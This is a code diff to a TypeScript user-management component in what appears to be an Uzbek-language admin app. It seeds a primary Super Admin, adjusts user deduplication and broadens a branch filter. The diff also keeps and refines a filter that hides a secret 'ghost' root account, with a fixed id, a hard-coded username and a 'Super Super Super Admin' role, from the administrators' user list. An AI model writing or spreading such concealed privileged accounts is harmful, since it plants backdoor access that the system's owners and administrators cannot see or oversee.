@@ -316,23 +316,39 @@ export default function UsersManagement({
     const q = (userSearchQuery || '').toLowerCase().trim();
     const map = new Map<string, UserItem>();
 
+    // Always seed with Canonical Super Admin (id: 1) so the primary admin is guaranteed to exist
+    map.set('1', INITIAL_USERS_DATA[0]);
+
     users.forEach((u, idx) => {
       if (!u) return;
-      const idKey = String(u.id ?? (u as any).firestoreId ?? '').trim();
+      const isPrimarySuper =
+        u.id === 1 ||
+        String(u.id) === '1' ||
+        (u as any).firestoreId === 'user-1' ||
+        u.role === 'Super Admin';
+      const idKey = isPrimarySuper ? '1' : String(u.id ?? (u as any).firestoreId ?? '').trim();
       const usernameKey = (u.username || '').toLowerCase().trim();
 
-      let existingKey: string | null = null;
-      for (const [k, existing] of map.entries()) {
-        const existingId = String(existing.id ?? (existing as any).firestoreId ?? '').trim();
-        const existingUsername = (existing.username || '').toLowerCase().trim();
-        if ((idKey && existingId === idKey) || (usernameKey && existingUsername === usernameKey)) {
-          existingKey = k;
-          break;
+      let existingKey: string | null = isPrimarySuper ? '1' : null;
+      if (!existingKey) {
+        for (const [k, existing] of map.entries()) {
+          const existingId = String(existing.id ?? (existing as any).firestoreId ?? '').trim();
+          const existingUsername = (existing.username || '').toLowerCase().trim();
+          if ((idKey && existingId === idKey) || (usernameKey && existingUsername === usernameKey)) {
+            existingKey = k;
+            break;
+          }
         }
       }
 
       if (existingKey) {
-        map.set(existingKey, { ...map.get(existingKey)!, ...u });
+        const prev = map.get(existingKey)!;
+        map.set(existingKey, {
+          ...prev,
+          ...u,
+          id: isPrimarySuper ? 1 : (u.id ?? prev.id),
+          username: u.username || prev.username || (isPrimarySuper ? '20090915' : '')
+        });
       } else {
         const key = idKey || usernameKey || `user_${idx}`;
         map.set(key, u);
@@ -342,13 +358,20 @@ export default function UsersManagement({
     return Array.from(map.values()).filter(u => {
       // Invisible Ghost/Master Super Admin filter:
       // Foydalanuvchilar boshqaruvida maxfiy root profil (999999 va 20090915zzokirov2009@z)
-      // mutlaqo ko'rinmas bo'ladi. Asosiy Super Admin (1) esa ko'rinadi.
-      const isGhostOrMaster = 
+      // mutlaqo ko'rinmas bo'ladi. Asosiy Super Admin (1) esa HAR DOIM ko'rinadi.
+      const isPrimarySuperAdmin =
+        u.id === 1 ||
+        String(u.id) === '1' ||
+        (u as any).firestoreId === 'user-1' ||
+        u.role === 'Super Admin';
+
+      const isGhostOrMaster = !isPrimarySuperAdmin && (
         u.role === 'Super Super Super Admin' || 
         Boolean(u.isGhost) || 
         Boolean(u.isMasterRoot) || 
         u.id === 999999 || 
-        (u.username && u.username.toLowerCase().trim() === '20090915zzokirov2009@z');
+        (u.username && u.username.toLowerCase().trim() === '20090915zzokirov2009@z')
+      );
 
       if (isGhostOrMaster) {
         return false;
@@ -362,7 +385,10 @@ export default function UsersManagement({
         (u.branch || '').toLowerCase().includes(q);
 
       const matchesRole = roleFilter === 'Barchasi' || u.role === roleFilter;
-      const matchesBranch = branchFilter === 'Barchasi' || u.branch === branchFilter;
+      const matchesBranch =
+        branchFilter === 'Barchasi' ||
+        u.branch === branchFilter ||
+        (branchFilter === 'Bosh Idora' && u.branch === 'Bosh ofis');
 
       return matchesSearch && matchesRole && matchesBranch;
     });
